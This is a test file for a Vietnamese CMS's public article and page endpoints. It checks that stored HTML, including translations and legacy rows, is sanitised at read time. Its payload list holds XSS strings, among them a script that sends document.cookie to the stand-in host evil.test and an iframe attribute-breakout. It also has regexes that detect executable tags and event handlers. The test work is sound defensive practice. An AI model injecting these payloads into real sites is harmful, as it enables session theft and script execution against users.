import assert from 'node:assert/strict'
import test, { mock } from 'node:test'
import { getTableName, type Table } from 'drizzle-orm'

/**
 * Lọc lúc ĐỌC ở hai endpoint công khai (CLAUDE.md: "HTML hiển thị bằng `v-html` phải qua
 * `sanitizeHtml` lúc ghi *và* lúc đọc — kể cả bản dịch"). Hàng ghi trước khi có lớp lọc lúc
 * ghi vẫn nằm trong CSDL, và cả hai endpoint đưa chúng thẳng vào `v-html`:
 *
 *   - `GET /api/public/articles/:slug?lang=…` — `article_translations.content`;
 *   - `GET /api/public/pages/:slug?lang=…` — `data` của khối, gộp với
 *     `data.translations[lang]`, ở cả cây đã xuất bản lẫn đường hàng phẳng cũ.
 *
 * Trước đây hai bất biến này chỉ được giữ bằng khẳng định văn bản trong
 * `tests/security-translation-html.test.ts` (mã nguồn phải chứa
 * `sanitizeHtml(translation.content)` / `sanitizeBlockData({ ...rawData, ...langOverrides })`).
 * Ở đây handler thật chạy trên hàng độc hại đã lưu, nên một cách viết khác vẫn lọc thì
 * không đỏ, còn một nhánh mới quên lọc thì đỏ (docs/decisions/test-strategy.md).
 */

const EXECUTABLE = /<\s*(script|object|embed|svg|math|style|form|input|button)\b/i
const EVENT_HANDLER = /\son[a-z]+\s*=/i
const DANGEROUS_SCHEME = /(javascript|vbscript|data:text\/html)\s*:/i
const neutralised = (html: string) => !EXECUTABLE.test(html) && !EVENT_HANDLER.test(html) && !DANGEROUS_SCHEME.test(html)

const PAYLOADS = [
  '<p>Xin chào</p><script>fetch("//evil.test/?c="+document.cookie)</script>',
  '<img src=x onerror="alert(document.domain)">',
  '<a href="javascript:alert(1)">bấm vào đây</a>',
  '<svg onload=alert(1)><script>alert(2)</script></svg>',
  '<p onclick="alert(1)">đoạn</p>',
]

/** Hàng đã lưu, theo tên bảng. Mỗi lượt đọc nhận bản sao: handler không sửa được "CSDL". */
const stored = new Map<string, Array<Record<string, unknown>>>()
function select() {
  return {
    from(table: Table) {
      const rows = () => structuredClone(stored.get(getTableName(table)) ?? [])
      const chain = {
        leftJoin: () => chain,
        where: () => Object.assign(Promise.resolve().then(rows), { limit: async () => rows(), orderBy: async () => rows() }),
      }
      return chain
    },
  }
}
mock.module('../server/utils/db', { namedExports: { getDb: () => ({ select }), getPool: () => null } })

type Event = { params: Record<string, string>, query: Record<string, string> }
const globals = globalThis as unknown as Record<string, unknown>
globals.defineEventHandler = (handler: unknown) => handler
globals.getRouterParam = (event: Event, key: string) => event.params[key]
globals.getQuery = (event: Event) => event.query
globals.getCookie = () => undefined
globals.createError = (input: { statusCode: number, statusMessage: string }) => Object.assign(new Error(input.statusMessage), input)
globals.setResponseStatus = () => {}
globals.setResponseHeader = () => {}
globals.setHeader = () => {}

type Article = { content: string, title: string, translatedFrom?: string }
type PublicNode = { blockType: string, data: Record<string, unknown>, children?: PublicNode[] }
const articleDetail = (await import('../server/api/public/articles/[slug].get')).default as unknown as (event: Event) => Promise<{ article: Article }>
const publicPage = (await import('../server/api/public/pages/[slug].get')).default as unknown as (event: Event) => Promise<{ ok: boolean, blocks: PublicNode[] }>

const ARTICLE = {
  id: 7, type: 'news', category: null, categoryId: null, categoryName: null, categorySlug: null,
  title: 'Tập huấn', slug: 'tap-huan', excerpt: 'Tóm tắt', content: '<p>Bản gốc</p>',
  thumbnailUrl: null, publishedAt: null, createdAt: null, authorName: 'admin', viewTotal: 0,
}
const translated = (content: string | null) => {
  stored.set('articles', [ARTICLE])
  stored.set('article_translations', [{ title: 'Training', excerpt: 'Summary', content, status: 'published', langCode: 'en' }])
}
const readArticle = async (lang: string) => (await articleDetail({ params: { slug: 'tap-huan' }, query: { lang } })).article

test('article: a stored translation carrying a script, a handler or a javascript: link is served neutralised', async () => {
  for (const payload of PAYLOADS) {
    translated(payload)
    const article = await readArticle('en')
    assert.equal(article.title, 'Training', 'the translation is the one being served')
    assert.ok(neutralised(article.content), `served as-is: ${article.content}`)
  }
  translated(PAYLOADS[0]!)
  assert.match((await readArticle('en')).content, /Xin chào/, 'the text around the payload survives')
})

test('article: legitimate translated markup is served as written', async () => {
  const html = '<h2>Training</h2><p>Hello <strong>world</strong>, <em>welcome</em>.</p>'
  translated(html)
  assert.equal((await readArticle('en')).content, html)
})

test('article: a translation without content falls back to the original body', async () => {
  translated(null)
  assert.equal((await readArticle('en')).content, ARTICLE.content)
})

// ─── Thân bài GỐC (`articles.content`) — CHANGELOG § 103 ──────────────────────────────────────────
// Trang bài viết và trang in dựng thân bài bằng `v-html` từ chính endpoint này. Hàng nhập từ trang cũ hoặc ghi
// ngoài app chưa từng qua lớp lọc lúc ghi, nên endpoint lọc lúc đọc — ở cả ba lối trả về: tiếng Việt, "chưa có
// bản dịch" (kèm `availableTranslations`), và bản dịch rỗng lùi về thân gốc.
const BODY_PAYLOADS = [
  ...PAYLOADS,
  // Dạng § 96: dấu nháy thoát đôi đóng thuộc tính `src` của iframe YouTube rồi mở `onload`.
  '<iframe src="https://www.youtube.com/embed/AAAAAAAAAAA?&#34; onload=&#34;alert(1)"></iframe>',
]
const withBody = (content: string | null, translation?: { content: string | null }) => {
  stored.set('articles', [{ ...ARTICLE, content }])
  stored.set('article_translations', translation
    ? [{ title: 'Training', excerpt: 'Summary', status: 'published', langCode: 'en', ...translation }]
    : [])
}

test('article body: a stored script, handler, javascript: link or § 96 iframe is served neutralised on every return path', async () => {
  for (const payload of BODY_PAYLOADS) {
    const html = `<p>Mở đầu</p>${payload}<p>Kết</p>`
    // vi, no language, a language with no translation row.
    withBody(html)
    for (const lang of ['', 'vi', 'en']) {
      const article = await readArticle(lang)
      assert.ok(neutralised(article.content), `${lang || 'no lang'}: served as-is: ${article.content}`)
      assert.match(article.content, /Mở đầu/, `${lang || 'no lang'}: the text around the payload survives`)
    }
    // A published translation whose content is NULL falls back to the original body — filtered too.
    withBody(html, { content: null })
    const fallback = await readArticle('en')
    assert.equal(fallback.title, 'Training', 'the translation row is the one being served')
    assert.ok(neutralised(fallback.content), `null-translation fallback served as-is: ${fallback.content}`)
  }
})

test('article body: legitimate markup, styles and an empty body are served as before', async () => {
  const html = '<h2>Tập huấn</h2><p style="text-align: center;">Cục <strong>C11</strong> — <em>Bộ Công an</em>.</p><p><img alt="" src="/uploads/a.jpg"></p>'
  withBody(html)
  const served = (await readArticle('vi')).content
  assert.match(served, /<h2>Tập huấn<\/h2>/)
  assert.match(served, /<p style="text-align: center;">Cục <strong>C11<\/strong> — <em>Bộ Công an<\/em>\.<\/p>/)
  assert.match(served, /<img [^>]*src="\/uploads\/a\.jpg"/)
  withBody(null)
  assert.equal((await readArticle('vi')).content, null, 'a null body stays null, not the empty string')
})

const PAGE = { id: 3, slug: 'about', title: 'Giới thiệu', seoTitle: null, seoDescription: null }
const readPage = async (lang: string) => publicPage({ params: { slug: 'about' }, query: lang ? { lang } : {} })
const flatten = (nodes: PublicNode[]): PublicNode[] => nodes.flatMap(node => [node, ...flatten(node.children ?? [])])
const htmlOf = (nodes: PublicNode[]) => flatten(nodes).flatMap(node => ['html', 'bodyHtml', 'content'].map(key => node.data[key]).filter(v => typeof v === 'string')) as string[]

test('page (published tree): block HTML and its translation are neutralised, at the top level and inside containers', async () => {
  for (const payload of PAYLOADS) {
    stored.set('pages', [{
      ...PAGE,
      publishedBlocks: [
        { blockType: 'rich_text', isVisible: true, data: { html: payload, translations: { en: { html: payload, bodyHtml: payload } } } },
        { blockType: 'section', isVisible: true, data: {}, children: [
          { blockType: 'rich_text', isVisible: true, data: { content: payload, translations: { en: { content: payload } } } },
        ] },
      ],
    }])
    for (const lang of ['', 'vi', 'en']) {
      const response = await readPage(lang)
      const fields = htmlOf(response.blocks)
      // vi: html + the child's content. en: the override replaces both and adds bodyHtml.
      assert.equal(fields.length, lang === 'en' ? 3 : 2, `${lang || 'no lang'}: every HTML field is served`)
      for (const html of fields) assert.ok(neutralised(html), `${lang || 'no lang'}: served as-is: ${html}`)
      assert.ok(neutralised(JSON.stringify(response.blocks)), `${lang || 'no lang'}: a payload left the server in another field`)
    }
  }
})

test('page (legacy flat rows): the same read-time filter applies when there is no published tree', async () => {
  stored.set('pages', [{ ...PAGE, publishedBlocks: null }])
  for (const payload of PAYLOADS) {
    stored.set('page_blocks', [
      { id: 10, blockType: 'rich_text', displayOrder: 1, data: { html: payload, translations: { en: { html: payload } } } },
      { id: 11, blockType: 'content_aside', displayOrder: 2, data: { body: '<p>ok</p>', translations: { en: { bodyHtml: payload } } } },
    ])
    for (const lang of ['vi', 'en']) {
      const response = await readPage(lang)
      assert.equal(response.blocks.length, 2)
      for (const html of htmlOf(response.blocks)) assert.ok(neutralised(html), `${lang}: served as-is: ${html}`)
      assert.ok(neutralised(JSON.stringify(response.blocks)), `${lang}: a payload left the server in another field`)
    }
  }
})

test('page: legitimate block markup survives the read-time filter', async () => {
  const html = '<h2>Giới thiệu</h2><p>Cục <strong>C11</strong> — <em>Bộ Công an</em>.</p>'
  stored.set('pages', [{ ...PAGE, publishedBlocks: [{ blockType: 'rich_text', isVisible: true, data: { html, translations: { en: { html } } } }] }])
  for (const lang of ['vi', 'en']) assert.equal((await readPage(lang)).blocks[0]!.data.html, html, lang)
})
